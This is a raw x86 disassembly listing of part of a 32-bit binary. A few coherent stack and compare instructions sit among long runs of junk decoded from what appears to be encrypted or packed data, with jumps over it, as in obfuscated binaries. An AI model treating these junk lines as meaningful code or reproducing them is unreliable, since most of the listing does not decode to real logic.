  40bc49:	jl     0x40bc27
  40bc4b:	lods   eax,DWORD PTR ds:[esi]
  40bc4c:	lods   al,BYTE PTR ds:[esi]
  40bc4d:	stos   BYTE PTR es:[edi],al
  40bc4e:	add    cl,bh
  40bc50:	ret    
  40bc51:	push   cs
  40bc52:	dec    ecx
  40bc53:	imul   esi,DWORD PTR [ebp+ecx*8-0x53a7e674],0x6
  40bc5b:	mov    ebx,edi
  40bc5d:	popa   
  40bc5e:	dec    ecx
  40bc5f:	movzx  eax,WORD PTR [eax+edi*2]
  40bc63:	mov    ecx,DWORD PTR [ebp-0x14]
  40bc66:	mov    eax,DWORD PTR [ecx+eax*4]
  40bc69:	mov    DWORD PTR [ebp+0xc],eax
  40bc6c:	mov    eax,DWORD PTR [ebp-0x4]
  40bc6f:	mov    ecx,DWORD PTR [ebp-0x8]
  40bc72:	xor    eax,0x7510854
  40bc77:	add    eax,ebx
  40bc79:	cmp    ecx,eax
  40bc7b:	jne    0x40bef1
  40bc81:	mov    eax,DWORD PTR [ebp-0x4]
  40bc84:	jmp    0x40bee7
  40bc89:	into   
  40bc8a:	mov    esp,0xb26ca26c
  40bc8f:	shl    BYTE PTR [eax+0x17],1
  40bc92:	stos   DWORD PTR es:[edi],eax
  40bc93:	mov    WORD PTR [eax],?
  40bc95:	arpl   WORD PTR [edx],bp
  40bc97:	sbb    al,0x31
  40bc99:	(bad)  
  40bc9a:	sti    
  40bc9b:	jle    0x40bd1b
  40bc9d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bca1:	sub    dl,BYTE PTR [eax-0x6a]
  40bca4:	pop    ecx
  40bca5:	dec    edi
  40bca6:	int    0x96
  40bca8:	lock lods eax,DWORD PTR ds:[esi]
  40bcaa:	div    BYTE PTR [ecx+0x76a7a7cb]
  40bcb0:	out    0x8d,al
  40bcb2:	ins    DWORD PTR es:[edi],dx
  40bcb3:	add    al,0xfd
  40bcb5:	cmp    DWORD PTR [eax+0x306418e1],0x74f1fa5a
  40bcbf:	lahf   
  40bcc0:	frstor [ecx-0x16b6d738]
  40bcc6:	lahf   
  40bcc7:	cmc    
  40bcc8:	retf   0x97bd
  40bccb:	push   cs
  40bccc:	xchg   ebx,eax
  40bccd:	rol    BYTE PTR [eax+edx*8+0x78],cl
  40bcd1:	in     eax,0x3a
  40bcd3:	jne    0x40bd0d
  40bcd5:	mov    esp,0x4392deb0
  40bcda:	pop    edi
  40bcdb:	sub    BYTE PTR [eax+0x65c90b02],ch
  40bce1:	push   edx
  40bce2:	jo     0x40bd1a
  40bce4:	pop    eax
  40bce5:	arpl   WORD PTR ds:0x29e2616f,bx
  40bceb:	ret    
  40bcec:	push   edi
  40bced:	ins    DWORD PTR es:[edi],dx
  40bcee:	sub    al,0xe
  40bcf0:	dec    eax
  40bcf1:	clc    
  40bcf2:	cs jle 0x40bd6b
  40bcf5:	mov    eax,ds:0x45f842f0
  40bcfa:	test   BYTE PTR [eax],ch
  40bcfc:	pop    es
  40bcfd:	ss push esi
  40bcff:	(bad)  
  40bd00:	sbb    al,0x66
  40bd02:	jg     0x40bc94
  40bd04:	scas   eax,DWORD PTR es:[edi]
  40bd05:	cs push ebx
  40bd07:	sar    BYTE PTR [ecx],1
  40bd09:	jp     0x40bd2d
  40bd0b:	mov    dl,0x37
  40bd0d:	sar    dh,1
  40bd0f:	(bad)  
  40bd10:	(bad)  
  40bd11:	call   0xaa48:0xa3b6f244
  40bd18:	outs   dx,DWORD PTR ds:[esi]
  40bd19:	fstp   DWORD PTR [ecx]
  40bd1b:	int3   
  40bd1c:	push   esp
  40bd1d:	pop    edx
  40bd1e:	test   BYTE PTR [edx+0x3d69ec66],ah
  40bd24:	jbe    0x40bd3e
  40bd26:	mov    eax,0xcf760421
  40bd2b:	or     bh,BYTE PTR [edx+ebx*1-0x1a154859]
  40bd32:	dec    edx
  40bd33:	cdq    
  40bd34:	add    ebp,DWORD PTR [ecx+0x7d]
  40bd37:	ficomp WORD PTR [edi+0x45]
  40bd3a:	ins    DWORD PTR es:[edi],dx
  40bd3b:	push   cs
  40bd3c:	(bad)  
  40bd3d:	setle  BYTE PTR [edx-0x3e]
  40bd41:	std    
  40bd42:	xchg   edi,eax
  40bd43:	add    eax,DWORD PTR [edx]
  40bd45:	xor    eax,DWORD PTR [edx]
  40bd47:	imul   esi,DWORD PTR [ebx-0x16],0xffffffb6
  40bd4b:	mov    cl,al
  40bd4d:	enter  0x80e6,0xce
  40bd51:	enter  0x51f3,0x69
  40bd55:	iret   
  40bd56:	mov    cs,WORD PTR ds:0x9f695201
  40bd5c:	popa   
  40bd5d:	mov    es,WORD PTR [esi-0x50bbdf10]
  40bd63:	push   ebx
  40bd64:	sub    ah,bl
  40bd66:	xchg   esp,eax
  40bd67:	dec    esi
  40bd68:	xor    esi,eax
  40bd6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd6b:	mov    dh,0x35
  40bd6d:	pop    esp
  40bd6e:	not    al
  40bd70:	(bad)  
  40bd71:	in     eax,0x44
  40bd73:	das    
  40bd74:	jg     0x40bda1
  40bd76:	sbb    DWORD PTR [eax-0x8e02a6a],edx
  40bd7c:	rcr    DWORD PTR [edx],1
  40bd7e:	scas   al,BYTE PTR es:[edi]
  40bd7f:	imul   esi,DWORD PTR ds:0x86f4b701,0xf835c85
  40bd89:	aam    0xbf
  40bd8b:	push   edi
  40bd8c:	fcmovnbe st,st(3)
  40bd8e:	pop    edi
  40bd8f:	dec    ecx
  40bd90:	fwait
  40bd91:	(bad)  
  40bd92:	arpl   WORD PTR [ebx-0x73],bx
  40bd95:	xor    edi,DWORD PTR [ebx]
  40bd97:	mov    cl,0xb9
  40bd99:	cwde   
  40bd9a:	(bad)  
  40bd9b:	push   eax
  40bd9c:	fisub  WORD PTR [ebx+0x8c7871]
  40bda2:	jle    0x40be19
  40bda4:	dec    edi
  40bda5:	mov    ebx,DWORD PTR [ebx]
  40bda7:	adc    ebx,edi
  40bda9:	arpl   WORD PTR [esi],bp
  40bdab:	dec    edi
  40bdac:	sub    eax,0x2a174df7
  40bdb1:	adc    al,0xaa
  40bdb3:	scas   eax,DWORD PTR es:[edi]
  40bdb4:	mov    ah,0x57
  40bdb6:	or     BYTE PTR [esp+eiz*8-0x65abd2c8],ah
  40bdbd:	mov    edx,es
  40bdbf:	or     BYTE PTR [ebp-0x5783fd5d],cl
  40bdc5:	mov    ebx,0xe959ee9b
  40bdca:	mov    dl,0xbe
  40bdcc:	pop    ecx
  40bdcd:	mov    edi,DWORD PTR [eax]
  40bdcf:	sar    BYTE PTR [eax*2+0x446d6d9e],cl
  40bdd6:	xchg   edi,eax
  40bdd7:	sti    
  40bdd8:	sbb    dl,BYTE PTR [edi+edx*1-0x5c15fe5b]
  40bddf:	clc    
  40bde0:	cmp    DWORD PTR [esi-0x6e998ec6],0x6d
  40bde7:	mov    esi,0x813ecb9a
  40bdec:	mov    dl,0x52
  40bdee:	daa    
  40bdef:	sahf   
  40bdf0:	and    edx,0xffffffd0
  40bdf3:	stos   BYTE PTR es:[edi],al
  40bdf4:	pop    ecx
  40bdf5:	push   esp
  40bdf6:	mov    al,ds:0xe698af1f
  40bdfb:	pop    esi
  40bdfc:	jmp    0xa69abc61
  40be01:	outs   dx,DWORD PTR ds:[esi]
  40be02:	fcmovb st,st(7)
  40be04:	lods   eax,DWORD PTR ds:[esi]
  40be05:	jbe    0x40be34
  40be07:	sub    BYTE PTR [esi],0x88
  40be0a:	push   0xe7d2f8a8
  40be0f:	mov    esp,eax
  40be11:	ficom  DWORD PTR [ebp+ecx*8+0xa]
  40be15:	sbb    ebx,DWORD PTR [ecx+ebx*8]
  40be18:	inc    esp
  40be19:	inc    eax
  40be1a:	adc    al,BYTE PTR [ecx]
  40be1c:	ins    DWORD PTR es:[edi],dx
  40be1d:	jge    0x40bdd6
  40be1f:	lods   eax,DWORD PTR ds:[esi]
  40be20:	std    
  40be21:	popf   
  40be22:	add    eax,0x5c9b11dc
  40be27:	sar    BYTE PTR [ecx],0x58
  40be2a:	mov    esi,0x49d808ac
  40be2f:	and    ebp,DWORD PTR ss:[ecx]
  40be32:	cmp    al,0xb6
  40be34:	xlat   BYTE PTR ds:[ebx]
  40be35:	jge    0x40beae
  40be37:	mov    ebx,0x1375c294
  40be3c:	xor    ebp,DWORD PTR [edx-0x22456305]
  40be42:	lods   eax,DWORD PTR ds:[esi]
  40be43:	jae    0x40be82
  40be45:	push   esp
  40be46:	dec    esi
  40be47:	dec    ebp
  40be48:	or     eax,0x17bb80ee
  40be4d:	sub    ecx,ebx
  40be4f:	xchg   ebp,eax
  40be50:	mov    esi,0x26933fc5
  40be55:	xor    al,0x69
  40be57:	mov    ah,0x75
  40be59:	mov    esp,0x8f5fa048
  40be5e:	mov    ?,WORD PTR [esi-0xd]
  40be61:	cwde   
  40be62:	test   bl,ch
  40be64:	cmp    dl,BYTE PTR [ebp-0x78a7426]
  40be6a:	xchg   esp,eax
  40be6b:	add    BYTE PTR [ebx+0x16],ah
  40be6e:	out    0xc,al
  40be70:	pop    ss
  40be71:	test   DWORD PTR [ebp-0x1a],0xc8a2c34c
  40be78:	jo     0x40be30
  40be7a:	out    0xdd,al
  40be7c:	mov    ah,0xe3
  40be7e:	mov    esp,0xeaf58647
  40be83:	sbb    eax,0x69984d26
  40be88:	dec    edx
  40be89:	mov    edi,0xa94da62e
  40be8e:	cwde   
  40be8f:	adc    BYTE PTR [esp+edx*1],al
  40be92:	mov    edi,0x6b0266bb
  40be97:	mov    ds:0x4ab94dec,al
  40be9c:	xor    al,BYTE PTR [ebx+0x42]
  40be9f:	or     al,0x94
  40bea1:	mov    edx,DWORD PTR ds:0xd4d95581
  40bea7:	add    al,0xe6
  40bea9:	inc    eax
  40beaa:	xor    bh,dh
  40beac:	in     al,dx
  40bead:	jbe    0x40be97
  40beaf:	(bad)  
  40beb0:	push   ebp
  40beb1:	popa   
  40beb2:	popf   
  40beb3:	(bad)  
  40beb5:	mov    DWORD PTR [eax-0x7d],esp
  40beb8:	mov    BYTE PTR ds:0xd91bd16b,ch
  40bebe:	fbld   TBYTE PTR [ebx+0x6]
  40bec1:	cmp    BYTE PTR [ebx],bh
  40bec3:	or     al,0x32
  40bec5:	jb     0x40beba
  40bec7:	jnp    0x40bee8
  40bec9:	jae    0x40bf29
  40becb:	mov    esi,DWORD PTR [ecx-0x4155d016]
  40bed1:	xor    edx,esi
  40bed3:	push   edx
  40bed4:	mov    ?,WORD PTR [eax-0x433fcfb0]
  40beda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bedb:	mov    bl,0x9f
  40bedd:	sub    eax,0xb3b245f3
  40bee2:	adc    al,0x7d
  40bee4:	mov    WORD PTR [esi+0x8543560],?
  40beea:	push   ecx
  40beeb:	pop    es
  40beec:	jmp    0x40b9f2
  40bef1:	mov    eax,DWORD PTR [ebp+0xc]
  40bef4:	add    eax,DWORD PTR [ebp+0x8]
  40bef7:	mov    DWORD PTR [ebp-0x10],eax
  40befa:	mov    eax,DWORD PTR [ebp-0x1c]
  40befd:	test   eax,eax
  40beff:	je     0x40cbbe
  40bf05:	mov    DWORD PTR [ebp-0x24],esi
  40bf08:	push   0xb
  40bf0a:	pop    ecx
  40bf0b:	push   0x5
  40bf0d:	dec    ecx
  40bf0e:	pop    ebx
  40bf0f:	xchg   ebx,ecx
  40bf11:	sub    ebx,ecx
  40bf13:	jmp    0x40c176
  40bf18:	pop    ecx
  40bf19:	jbe    0x69f82f56
  40bf1f:	push   ecx
  40bf20:	scas   eax,DWORD PTR es:[edi]
  40bf21:	or     cl,BYTE PTR [esi-0x1f37a1cf]
  40bf27:	aam    0x80
  40bf29:	stc    
  40bf2a:	jle    0x40bfaa
  40bf2c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40bf30:	xchg   edi,eax
  40bf31:	push   edi
  40bf32:	push   edi
  40bf33:	cmp    edi,edi
  40bf35:	mov    eax,0x7591016e
  40bf3a:	nop
  40bf3b:	imul   esp,DWORD PTR [edi+0x60],0xaa7a7e71
  40bf42:	mov    ds:0xd0ccad83,eax
  40bf47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf48:	shr    DWORD PTR [eax-0x4e],0x4b
  40bf4c:	mov    WORD PTR [edx],gs
  40bf4e:	xlat   BYTE PTR ds:[ebx]
  40bf4f:	test   DWORD PTR [edi-0x21],0x7090ba2e
  40bf56:	out    dx,al
  40bf57:	je     0x40bf2e
  40bf59:	mov    DWORD PTR [ebp-0x6a376c9b],ebp
  40bf5f:	pop    es
  40bf60:	pop    edi
  40bf61:	jp     0x40befa
  40bf63:	xchg   ebp,eax
  40bf64:	jo     0x40bf54
  40bf66:	inc    edi
  40bf67:	add    al,0x92
  40bf69:	xor    BYTE PTR [esi+0x2d237c2a],dh
  40bf6f:	and    eax,0xcb50e0bf
  40bf74:	and    eax,0x1357d5b5
  40bf79:	bound  ebx,QWORD PTR [ecx+0x16]
  40bf7c:	test   bh,al
  40bf7e:	add    dh,0x3a
  40bf81:	in     al,dx
  40bf82:	(bad)  
  40bf83:	ficom  DWORD PTR [edi+ecx*2+0x3b22d83]
  40bf8a:	mov    ah,0xb8
  40bf8c:	test   BYTE PTR [edi-0x6cbdfd5e],bl
  40bf92:	and    al,BYTE PTR [ecx+0x7742fb08]
  40bf98:	adc    dh,cl
  40bf9a:	ss cli 
  40bf9c:	clc    
  40bf9d:	lds    esi,FWORD PTR [eax-0x7c901e3d]
  40bfa3:	popf   
  40bfa4:	mov    dh,0xb0
  40bfa6:	xor    DWORD PTR [ebx-0x156c32f5],0x7359d371
  40bfb0:	xor    DWORD PTR [ebx-0x57],esp
  40bfb3:	sbb    dl,BYTE PTR [ebx+0x8]
  40bfb6:	ds (bad) 
  40bfb8:	retf   
  40bfb9:	push   0x4e
  40bfbb:	jne    0x40bf5d
  40bfbd:	out    dx,eax
  40bfbe:	pop    es
  40bfbf:	call   DWORD PTR [edx-0x1]
  40bfc2:	mov    ebx,0x44ba4be0
  40bfc7:	jg     0x40bfa9
  40bfc9:	out    0xa9,eax
  40bfcb:	or     esp,DWORD PTR [ebx+0x39f37af9]
  40bfd1:	ds push ebx
  40bfd3:	int3   
  40bfd4:	iret   
  40bfd5:	push   eax
  40bfd6:	pop    edx
  40bfd7:	mov    WORD PTR [ecx-0x6873f246],es
  40bfdd:	pusha  
  40bfde:	pop    edx
  40bfdf:	adc    ecx,edx
  40bfe1:	add    eax,0x7c77c95c
  40bfe6:	xchg   esi,eax
  40bfe7:	mov    dh,0x5f
  40bfe9:	out    dx,al
  40bfea:	jge    0x40bfa0
  40bfec:	es sbb eax,0x885ecb2f
  40bff2:	xor    eax,0xb6b35901
  40bff7:	push   ecx
  40bff8:	xlat   BYTE PTR ds:[ebx]
  40bff9:	jb     0x40c020
  40bffb:	in     al,dx
  40bffc:	arpl   WORD PTR [ecx+0x6a8d9f75],bp
  40c002:	into   
  40c003:	xor    al,0xcb
  40c005:	(bad)  
  40c006:	loop   0x40bfcc
  40c008:	fdivr  DWORD PTR [eax+eax*4+0x40]
  40c00c:	cmp    al,0xcc
  40c00e:	push   es
  40c00f:	rcl    BYTE PTR [ebx-0x1f],cl
  40c012:	ret    0xfeaa
  40c015:	(bad)  
  40c016:	icebp  
  40c017:	mov    ah,0xd9
  40c019:	mov    eax,0xf8a0ee2b
  40c01e:	in     al,dx
  40c01f:	std    
  40c020:	pop    ss
  40c021:	aam    0x95
  40c023:	fsubr  DWORD PTR [ebx+0xbe64c13]
  40c029:	xchg   edx,eax
  40c02a:	in     al,dx
  40c02b:	xchg   esi,eax
  40c02c:	push   0xc8a4bf3f
  40c031:	jge    0x40c074
  40c033:	mov    dl,0x9
  40c035:	(bad)  
  40c036:	out    0x41,eax
  40c038:	jno    0x40c093
  40c03a:	add    eax,DWORD PTR [edx+eiz*2-0x51e0fb39]
  40c041:	mov    esi,0xdc19cf73
  40c046:	cmp    dh,BYTE PTR [ecx-0xb881d22]
  40c04c:	call   0xc4a461aa
  40c051:	push   es
  40c052:	hlt    
  40c053:	dec    esi
  40c054:	adc    dh,BYTE PTR [esi+0x2e5cd91d]
  40c05a:	mov    dl,0xcc
  40c05c:	(bad)  
  40c05d:	cmp    esp,ebx
  40c05f:	xor    DWORD PTR [ebp-0x388132ea],ebx
  40c065:	jno    0x40c08f
  40c067:	sub    DWORD PTR [eax+0x59],ebx
  40c06a:	dec    ecx
  40c06b:	add    al,0x99
  40c06d:	adc    eax,0x3d6683a6
  40c072:	push   0xffffffc0
  40c074:	jno    0x40c0d1
  40c076:	mov    cl,0x11
  40c078:	inc    edx
  40c079:	(bad)  [ecx+0x4a]
  40c07c:	push   ds
  40c07d:	das    
  40c07e:	add    BYTE PTR [ebp+0x13899fc0],cl
  40c084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c085:	dec    esp
  40c086:	mov    dl,0xde
  40c088:	xacquire xchg BYTE PTR [bx-0x3cc3],ch
  40c08e:	pop    eax
  40c08f:	gs xor esi,eax
  40c092:	out    0x9e,eax
  40c094:	mov    edi,0x31a0dca9
  40c099:	inc    esp
  40c09a:	add    BYTE PTR ds:0x88cb3706,dl
  40c0a0:	sahf   
  40c0a1:	dec    ebp
  40c0a2:	jg     0x40c024
  40c0a4:	out    dx,eax
  40c0a5:	dec    ebx
  40c0a6:	retf   
  40c0a7:	shl    BYTE PTR [ecx],0x49
  40c0aa:	mov    dl,0xd2
  40c0ac:	add    eax,0x8b541418
  40c0b1:	cmp    ebx,ebp
  40c0b3:	add    eax,0x27bf39de
  40c0b8:	xor    cl,bh
  40c0ba:	xchg   ebx,eax
  40c0bb:	inc    ch
  40c0bd:	mov    cl,cl
  40c0bf:	sbb    bh,ch
  40c0c1:	push   edx
  40c0c2:	jmp    0xa3f0e885
  40c0c7:	push   esp
  40c0c8:	dec    ebp
  40c0c9:	inc    edi
  40c0ca:	retf   
  40c0cb:	pusha  
  40c0cc:	dec    ecx
  40c0cd:	stos   BYTE PTR es:[edi],al
  40c0ce:	outs   dx,BYTE PTR ds:[esi]
  40c0cf:	scas   eax,DWORD PTR es:[edi]
  40c0d0:	ins    DWORD PTR es:[edi],dx
  40c0d1:	sbb    eax,0xbcf99ff6
  40c0d6:	fisub  WORD PTR [ebx+0x1057ba8d]
  40c0dc:	dec    edi
  40c0dd:	pop    es
  40c0de:	lahf   
  40c0df:	sbb    cl,BYTE PTR [ecx+0x62e27a0f]
  40c0e5:	push   es
  40c0e6:	les    ebx,FWORD PTR [esi-0x2f5ecb3f]
  40c0ec:	mov    WORD PTR [edi-0x76670033],fs
  40c0f2:	pop    es
  40c0f3:	add    ah,BYTE PTR [edx-0x47ad501c]
  40c0f9:	aam    0x8d
  40c0fb:	or     eax,0xee6a8305
  40c100:	dec    eax
  40c101:	out    0x5e,eax
  40c103:	sbb    ebx,DWORD PTR ds:0x4f89659e
  40c109:	scas   eax,DWORD PTR es:[edi]
  40c10a:	jne    0x40c0ea
  40c10c:	cmc    
  40c10d:	jb     0x40c0c1
  40c10f:	add    DWORD PTR [ebx+0x265ae01a],edx
  40c115:	lds    edx,FWORD PTR [edi+0x3440fc85]
  40c11b:	or     DWORD PTR [ebx+0x1142ed07],ecx
  40c121:	repnz mov edx,0x3c5b6db1
  40c127:	add    al,0xb3
  40c129:	sub    edx,DWORD PTR [eax]
  40c12b:	cmp    DWORD PTR [ecx+ecx*2+0x596e9010],esp
  40c132:	jns    0x40c190
  40c134:	add    al,0xd4
  40c136:	push   es
  40c137:	add    al,0x6e
  40c139:	sub    eax,0x4af58982
  40c13e:	and    al,bh
  40c140:	mov    ds:0x5d7fde25,al
  40c145:	xor    ch,BYTE PTR ds:0x1bd8394e
  40c14b:	xor    ebp,DWORD PTR [edx+0x94ce65b]
  40c151:	mov    ecx,0xe2a80241
  40c156:	cld    
  40c157:	adc    eax,0xe6147db8
  40c15c:	fst    DWORD PTR [edx]
  40c15e:	in     al,dx
  40c15f:	cs cmc 
  40c161:	and    edi,DWORD PTR [ebp-0x6c]
  40c164:	dec    ecx
  40c165:	mov    ecx,0x188444a4
  40c16a:	push   es
  40c16b:	test   al,0x84
  40c16d:	(bad)
  40c170:	or     eax,0x69bc53ec
  40c175:	push   edi
  40c176:	xchg   ebx,ecx
  40c178:	dec    ecx
  40c179:	mov    eax,DWORD PTR [ebp-0x1c]
  40c17c:	imul   eax,ecx
  40c17f:	sub    esp,eax
  40c181:	mov    DWORD PTR [ebp-0x24],esp
  40c184:	jmp    0x40c3e7
  40c189:	dec    ebx
  40c18a:	loop   0x40c1d9
  40c18c:	lds    esi,FWORD PTR [ebp+0x71]
  40c18f:	push   ebx
  40c190:	jo     0x40c117
  40c192:	mov    cl,0xee
  40c194:	sub    al,0xd2
  40c196:	jl     0x40c13f
  40c198:	ror    DWORD PTR [edx-0x79],1
  40c19b:	jle    0x40c21b
  40c19d:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c1a1:	fwait
  40c1a2:	add    eax,0xe914a396
  40c1a7:	mov    DWORD PTR [esi-0x50],edi
  40c1aa:	ret    0xb3b6
  40c1ad:	scas   al,BYTE PTR es:[edi]
  40c1ae:	shr    DWORD PTR [edi-0x64ae8bc5],0x84
  40c1b5:	mov    ecx,0x95102f54
  40c1ba:	jg     0x40c14e
  40c1bc:	push   0x3f3c5f51
  40c1c1:	gs mov ebx,0x9f9f6f3b
  40c1c7:	or     al,0x55
  40c1c9:	or     BYTE PTR [ebp-0x51],ah
  40c1cc:	mov    DWORD PTR [eax],esi
  40c1ce:	scas   eax,DWORD PTR es:[edi]
  40c1cf:	jp     0x40c229
  40c1d1:	mov    ch,0xbb
  40c1d3:	ret    0x50be
  40c1d6:	adc    al,0x47
  40c1d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1d9:	inc    ebp
  40c1da:	mov    es,WORD PTR [ecx+0x1a]
  40c1dd:	cmp    eax,0x1ba4a81b
  40c1e2:	(bad)  
  40c1e4:	push   0xffffff9f
  40c1e6:	daa    
  40c1e7:	or     eax,0x42b6e318
  40c1ec:	or     dh,BYTE PTR [ecx+0x14e85f3c]
  40c1f2:	mov    bl,0x5f
  40c1f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c1f6:	push   es
  40c1f7:	add    ecx,DWORD PTR [ecx]
  40c1f9:	(bad)  
  40c1fb:	(bad)  
  40c1fc:	cmc    
  40c1fd:	jle    0x40c236
  40c1ff:	xlat   BYTE PTR ds:[ebx]
  40c200:	cwde   
  40c201:	fist   DWORD PTR [eax-0x699800af]
  40c207:	push   eax
  40c208:	outs   dx,DWORD PTR ds:[esi]
  40c209:	push   ebx
  40c20a:	test   esp,edx
  40c20c:	xchg   esp,eax
  40c20d:	imul   edi,esi,0xffffff9b
  40c210:	clc    
  40c211:	popf   
  40c212:	push   eax
  40c213:	rol    DWORD PTR [edi],cl
  40c215:	scas   eax,DWORD PTR es:[edi]
  40c216:	into   
  40c217:	mov    ebp,0x2209912a
  40c21c:	(bad)  
  40c21d:	stos   BYTE PTR es:[edi],al
  40c21e:	sub    esp,esp
  40c220:	cmp    BYTE PTR [edx+0x51],al
  40c223:	inc    esp
  40c224:	inc    esi
  40c225:	lods   al,BYTE PTR ds:[esi]
  40c226:	mov    eax,0x4e107aa9
  40c22b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c22c:	xor    esi,edx
  40c22e:	jmp    0x40c21d
  40c230:	and    esi,DWORD PTR [ebx-0x3e]
  40c233:	push   esi
  40c234:	push   ebx
  40c235:	imul   ebp,DWORD PTR [eax+ecx*2-0x4aebc1e7],0x17
  40c23d:	sti    
  40c23e:	jp     0x40c26e
  40c240:	mov    ecx,0xffc0c8c
  40c245:	imul   eax,DWORD PTR [ecx-0xc],0x5ddf6f6c
  40c24c:	pop    ecx
  40c24d:	ja     0x40c225
  40c24f:	cmp    ebp,edx
  40c251:	mov    al,0x2
  40c253:	sub    al,ch
  40c255:	ins    BYTE PTR es:[edi],dx
  40c256:	ja     0x40c235
  40c258:	sbb    al,0x6c
  40c25a:	jns    0x40c2ac
  40c25c:	mov    DWORD PTR [ecx],esp
  40c25e:	cwde   
  40c25f:	ficom  DWORD PTR [eax+eiz*4]
  40c262:	lods   al,BYTE PTR ds:[esi]
  40c263:	or     al,0xca
  40c265:	in     al,dx
  40c266:	xor    eax,0xe99e3e15
  40c26b:	sub    eax,DWORD PTR [ecx+edx*4]
  40c26e:	push   edx
  40c26f:	adc    BYTE PTR [eax+0x43],al
  40c272:	fisttp WORD PTR ds:[ecx+edi*1]
  40c276:	xchg   DWORD PTR [edi+edx*2+0x9],ebp
  40c27a:	fwait
  40c27b:	add    eax,0xc4260b72
  40c280:	xchg   ecx,edx
  40c282:	xchg   esi,eax
  40c283:	mov    ds:0x8b28b539,eax
  40c288:	(bad)  
  40c289:	mov    esi,0x7e37d439
  40c28e:	pusha  
  40c28f:	icebp  
  40c290:	loop   0x40c2cc
  40c292:	cmp    bl,ah
  40c294:	fidiv  WORD PTR [edi]
  40c296:	enter  0xffe9,0x9b
  40c29a:	mov    eax,ds:0xee779039
  40c29f:	jo     0x40c2db
  40c2a1:	push   eax
  40c2a2:	popa   
  40c2a3:	icebp  
  40c2a4:	mov    ebp,0x8c46a4c7
  40c2a9:	cmp    ebp,DWORD PTR [edi+0x2f]
  40c2ac:	xchg   ebp,eax
  40c2ad:	xor    al,0x51
  40c2af:	sti    
  40c2b0:	out    dx,eax
  40c2b1:	icebp  
  40c2b2:	icebp  
  40c2b3:	cs jp  0x40c252
  40c2b6:	gs mov al,0x5
  40c2b9:	out    dx,eax
  40c2ba:	popf   
  40c2bb:	cmp    BYTE PTR [esi],bh
  40c2bd:	dec    edi
  40c2be:	jmp    0xb3ba:0xbdf219cc
  40c2c5:	add    esp,ebx
  40c2c7:	mov    bl,0xe2
  40c2c9:	mov    edx,0xd49dc383
  40c2ce:	test   BYTE PTR [ebx],0x5c
  40c2d1:	and    eax,0x565f6557
  40c2d6:	and    bh,al
  40c2d8:	aaa    
  40c2d9:	into   
  40c2da:	arpl   WORD PTR ds:0x72acd41a,bp
  40c2e0:	fs (bad) 
  40c2e2:	sub    eax,0x66951da
  40c2e7:	lock rcl DWORD PTR fs:[eax],cl
  40c2eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c2ec:	xor    BYTE PTR [ebx],0x70
  40c2ef:	addr16 sahf 
  40c2f1:	loope  0x40c30e
  40c2f3:	mov    ch,0x5f
  40c2f5:	mov    edi,0x3c613f2e
  40c2fa:	cmp    BYTE PTR ds:0x3c22c76e,0xd5
  40c301:	and    bl,BYTE PTR [edx-0x1d]
  40c304:	sahf   
  40c305:	xor    edi,DWORD PTR [esi+0x37041940]
  40c30b:	cmp    eax,0xb08e2606
  40c310:	scas   eax,DWORD PTR es:[edi]
  40c311:	adc    al,0xa
  40c313:	shl    BYTE PTR [ebx+eax*2-0xeb88bbd],cl
  40c31a:	hlt    
  40c31b:	aaa    
  40c31c:	aam    0x7a
  40c31e:	jns    0x40c357
  40c320:	push   ss
  40c321:	ss push cs
  40c323:	xchg   esi,eax
  40c324:	and    al,0x96
  40c326:	pop    ebp
  40c327:	aas    
  40c328:	cmp    DWORD PTR [ebp-0x75],ecx
  40c32b:	or     al,0xd5
  40c32d:	push   ebx
  40c32e:	jmp    0xf82fa33c
  40c333:	push   esp
  40c334:	jp     0x40c358
  40c336:	pop    esp
  40c337:	push   eax
  40c338:	mov    ?,WORD PTR [edi-0x7f]
  40c33b:	ss int 0x51
  40c33e:	xor    al,BYTE PTR [edi+ebx*1-0x980b85b]
  40c345:	adc    BYTE PTR [ecx+0x1b12478f],ah
  40c34b:	inc    esp
  40c34c:	sub    BYTE PTR [esp+edi*8-0xafb9820],cl
  40c353:	daa    
  40c354:	clc    
  40c355:	test   eax,0x4d4d081b
  40c35a:	shr    DWORD PTR [edx-0x68d47157],1
  40c360:	inc    esp
  40c361:	shl    BYTE PTR [ecx+0x60],0x82
  40c365:	inc    eax
  40c366:	cmp    BYTE PTR [esi+ebx*8],dh
  40c369:	push   ds
  40c36a:	dec    edx
  40c36b:	xchg   edi,eax
  40c36c:	pop    ds
  40c36d:	jb     0x40c342
  40c36f:	pusha  
  40c370:	ss dec edi
  40c372:	out    dx,eax
  40c373:	xchg   esi,eax
  40c374:	mov    BYTE PTR [edi-0x3900bc91],cl
  40c37a:	fnstenv [eax+0x3f9f9f30]
  40c380:	scas   eax,DWORD PTR es:[edi]
  40c381:	cmp    al,0x61
  40c383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c384:	dec    esp
  40c385:	sbb    BYTE PTR [esi],bl
  40c387:	hlt    
  40c388:	fsub   DWORD PTR [ecx]
  40c38a:	sbb    al,BYTE PTR [ebx+0x551fc92c]
  40c390:	sub    al,0x12
  40c392:	mov    al,0x70
  40c394:	jle    0x40c37e
  40c396:	xchg   ebx,eax
  40c397:	push   es
  40c398:	test   al,0x8
  40c39a:	es sub al,0xee
  40c39d:	or     DWORD PTR ds:[esi],edx
  40c3a0:	fimul  DWORD PTR [edx-0xf61becf]
  40c3a6:	out    dx,eax
  40c3a7:	pop    edi
  40c3a8:	push   0xfffffffc
  40c3aa:	adc    eax,0x5b0c0578
  40c3af:	and    edx,ecx
  40c3b1:	mov    ds:0xa92e70dd,eax
  40c3b6:	addr16 push eax
  40c3b8:	pop    ebp
  40c3b9:	shl    DWORD PTR [ebx+ecx*2],0xb8
  40c3bd:	jmp    0xbac92f42
  40c3c2:	push   0x60
  40c3c4:	aad    0xb9
